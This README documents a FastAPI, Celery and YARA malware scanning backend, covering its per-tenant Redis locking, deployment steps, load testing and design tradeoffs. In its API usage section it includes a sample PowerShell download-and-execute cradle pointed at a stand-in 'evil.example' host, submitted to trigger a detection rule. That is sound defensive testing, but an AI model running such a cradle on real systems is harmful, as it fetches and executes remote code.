# CyberUltron Malware Scanning Pipeline

A minimal, production-oriented malware scanning backend built with FastAPI, Celery, RabbitMQ, Redis, Django ORM, and yara-python.

---

## Architecture Overview

```
Client
  │
  ▼
FastAPI (uvicorn, 4 workers)   ←  Dashboard UI at http://localhost:8000
  │  POST /scan → creates ScanResult(status=pending) in PostgreSQL
  │              → enqueues scan_payload task to RabbitMQ
  ▼
RabbitMQ (message broker)
  │
  ▼
Celery Workers (concurrency=8, queues: celery,default)
  │  ① Acquire per-tenant Redis lock
  │  ② Run YARA scan (pre-compiled rules)
  │  ③ Persist result to PostgreSQL via Django ORM
  │  ④ Release Redis lock
  ▼
PostgreSQL (ScanResult records)
Redis (distributed locks + Celery result backend)
```

---

## Approach to the Concurrency Constraint

### The Problem

- Same tenant → **sequential** processing (tasks must not overlap)
- Different tenants → **parallel** processing (full concurrency)

### The Solution: Per-Tenant Redis Mutex

Each Celery task attempts to acquire a Redis lock keyed by `tenant_lock:<tenant_id>` using a single atomic `SET NX EX` command before starting the YARA scan.

```
Lock key:   tenant_lock:acme_corp
Lock value: <celery-task-id>     ← owner identity, enables safe release
TTL:        60 seconds           ← safety net for crashed workers
```

**If the lock is free:** the task acquires it, runs the scan, then releases it.

**If the lock is taken** (another task for the same tenant is already running): the task calls `self.retry(countdown=2)` — it is re-queued and will try again in 2 seconds. The worker thread is freed immediately to process tasks for other tenants.

**Different tenants** have completely independent lock keys and never block each other.

### Proven in worker logs

```
# Same tenant → SEQUENTIAL (lock contention observed)
[tenant=tenant_001] Lock acquired, starting scan for scan_result_id=3
[tenant=tenant_001] Lock contended for scan_result_id=2, retrying in 2s
[tenant=tenant_001] Lock contended for scan_result_id=6, retrying in 2s
[tenant=tenant_001] Scan complete for scan_result_id=3 — status=matched
[tenant=tenant_001] Lock released for scan_result_id=3
[tenant=tenant_001] Lock acquired, starting scan for scan_result_id=2  ← starts AFTER #3 finishes
[tenant=tenant_001] Scan complete for scan_result_id=2 — status=matched
[tenant=tenant_001] Lock released for scan_result_id=2
[tenant=tenant_001] Lock acquired, starting scan for scan_result_id=6  ← starts AFTER #2 finishes

# Different tenants → PARALLEL (different lock keys, no contention)
[tenant=tenant_002] Lock acquired, starting scan for scan_result_id=8
[tenant=tenant_003] Lock acquired, starting scan for scan_result_id=9  ← same time as tenant_002
[tenant=tenant_004] Lock acquired, starting scan for scan_result_id=10 ← same time
```

### Why not Celery chains or priority queues?

| Approach | Problem |
|---|---|
| Dynamic per-tenant Celery chains | Requires persistent chain state and complex routing |
| `rate_limit` on the task | Rate limits are per-task-type globally, not per-tenant |
| DB-level advisory locks | Couples locking to DB; harder to tune timeouts |
| **Redis mutex (chosen)** | Explicit, observable, atomic, trivial to debug |

### YARA Rule Precompilation

`yara.compile()` is called **once per worker process** via Celery's `worker_process_init` signal and stored as a module-level singleton. Every subsequent task call uses `get_compiled_rules()` — a simple global lookup with no I/O or CPU overhead.

```python
@worker_process_init.connect
def compile_yara_rules(**kwargs):
    global _compiled_rules
    _compiled_rules = yara.compile(filepaths=rule_files)
    # Called once at startup; all tasks in this process reuse _compiled_rules
```

---

## Project Structure

```
.
├── docker-compose.yml
├── Dockerfile
├── manage.py
├── requirements.txt
├── rules/
│   └── malware_indicators.yar      # YARA rules (add more .yar files here)
├── scanner/
│   ├── __init__.py
│   ├── apps.py
│   ├── asgi.py                     # ASGI entry point (Django setup + FastAPI)
│   ├── api.py                      # FastAPI routes + dashboard UI
│   ├── celery_app.py               # Celery factory + YARA precompilation
│   ├── models.py                   # ScanResult Django model
│   ├── settings.py                 # Django + Celery settings
│   ├── tasks.py                    # scan_payload Celery task + Redis lock
│   ├── templates/
│   │   └── dashboard.html          # Web dashboard UI
│   └── migrations/
│       └── 0001_initial.py
├── locust_tests/
│   └── locustfile.py               # Locust load test
└── sample_logs.txt                 # Evidence of sequential/parallel behavior
```

---

## How to Run

### Prerequisites

- Docker ≥ 24.x and Docker Compose ≥ 2.x

### Start the full stack

```bash
git clone <your-repo-url>
cd cyberultron
docker compose up --build
```

First run takes 2-3 minutes (downloads images, compiles yara-python).
You know it's ready when you see:

```
worker-1  | YARA rules compiled at worker startup: ['malware_indicators']
worker-1  | celery@... ready.
api-1     | Application startup complete.
```

### Services

| Service | URL | Purpose |
|---|---|---|
| Scanner Dashboard | http://localhost:8000 | Web UI to submit and view scans |
| FastAPI docs | http://localhost:8000/docs | Auto-generated API documentation |
| RabbitMQ Management | http://localhost:15672 (guest/guest) | Message queue admin panel |
| PostgreSQL | localhost:5432 | Database |
| Redis | localhost:6379 | Locks + result backend |

### Using the Dashboard

Open **http://localhost:8000** in your browser. From there you can:

- Submit payloads using preset buttons (Clean, PowerShell, EICAR, etc.)
- Watch results update live from `pending` → `clean` or `matched`
- See which YARA rules fired on matched payloads
- Click **"Fire 5 tenants simultaneously"** to demo parallel execution

### Using the API directly (PowerShell)

```powershell
# Health check
Invoke-WebRequest -Uri http://localhost:8000/health -UseBasicParsing | Select-Object -ExpandProperty Content

# Submit a clean payload
Invoke-WebRequest -Uri http://localhost:8000/scan -Method POST `
  -ContentType "application/json" `
  -Body '{"tenant_id": "acme", "payload_text": "hello world"}' `
  -UseBasicParsing | Select-Object -ExpandProperty Content

# Submit a malicious payload (triggers PowerShellDownloadCradle rule)
Invoke-WebRequest -Uri http://localhost:8000/scan -Method POST `
  -ContentType "application/json" `
  -Body '{"tenant_id": "evil_corp", "payload_text": "IEX (New-Object Net.WebClient).DownloadString(http://evil.example)"}' `
  -UseBasicParsing | Select-Object -ExpandProperty Content

# Poll for result
Invoke-WebRequest -Uri http://localhost:8000/scan/1 -UseBasicParsing | Select-Object -ExpandProperty Content
```

---

## How to Run the Locust Test

### Install Locust

```bash
pip install locust
```

### Option A — Headless (CI-friendly)

```bash
locust -f locust_tests/locustfile.py \
       --host http://localhost:8000 \
       --users 20 \
       --spawn-rate 5 \
       --run-time 60s \
       --headless
```

### Option B — Interactive UI

```bash
locust -f locust_tests/locustfile.py --host http://localhost:8000
# Open http://localhost:8089 in your browser
```

### Observing sequential vs parallel behavior

While Locust runs, watch the worker logs:

```bash
docker compose logs -f worker
```

You will see:

```
# Two different tenants → PARALLEL (locks acquired simultaneously)
[tenant=tenant_001] Lock acquired, starting scan for scan_result_id=7
[tenant=tenant_003] Lock acquired, starting scan for scan_result_id=9

# Same tenant → SEQUENTIAL (second task waits for first to finish)
[tenant=tenant_001] Lock contended for scan_result_id=8, retrying in 2s
[tenant=tenant_001] Lock released for scan_result_id=7
[tenant=tenant_001] Lock acquired, starting scan for scan_result_id=8
```

---

## Key Tradeoffs

### Worker listens on both `celery` and `default` queues (`-Q celery,default`)

**Why:** Celery's built-in default queue is named `celery`. Adding `CELERY_TASK_DEFAULT_QUEUE = "default"` in settings redirects new tasks to the `default` queue. The worker listens on both to handle tasks published to either queue, ensuring no tasks are missed regardless of Celery's internal routing.

### Redis Lock TTL (60 seconds)

**Chosen:** 60s hard expiry on the lock.
**Tradeoff:** If a worker crashes mid-scan, the lock expires automatically — the next task for that tenant proceeds after at most 60 seconds instead of deadlocking forever.

### Retry-based waiting vs thread blocking

**Chosen:** `self.retry(countdown=2)` when the lock is contended.
**Tradeoff:** Up to 2 seconds of added latency per retry cycle for a contended tenant. In exchange, the worker thread is never blocked and immediately serves other tenants. With `MAX_RETRIES=30`, a task retries for up to 60 seconds before being dropped.

### Module-level YARA singleton

**Chosen:** Compiled once at `worker_process_init`, stored as a module global.
**Tradeoff:** YARA rules updates require a worker restart. Acceptable since rule updates are infrequent and the performance gain (zero recompilation per task) is significant.

### Sync Django ORM inside async FastAPI

**Chosen:** `loop.run_in_executor(None, ...)` wraps synchronous ORM calls.
**Tradeoff:** Adds thread-pool overhead per request. Django's native async ORM would be cleaner but requires additional database driver configuration. `run_in_executor` works reliably with the standard psycopg2 driver.

---

## Adding More YARA Rules

Drop any `.yar` or `.yara` file into the `rules/` directory. Each file becomes its own YARA namespace. Restart the worker to compile the new rules:

```bash
docker compose restart worker
```

---

## Troubleshooting

| Problem | Fix |
|---|---|
| Scans stuck on `pending` | Run `docker compose logs worker` — check if tasks are being received |
| Worker not receiving tasks | Ensure `-Q celery,default` is in the worker command in `docker-compose.yml` |
| Port conflict on 5432 | Stop local PostgreSQL: `sudo service postgresql stop` |
| Worker shows connection errors | RabbitMQ may still be starting — run `docker compose restart worker` |
| Dashboard not loading | Hard refresh browser with `Ctrl+Shift+R` |
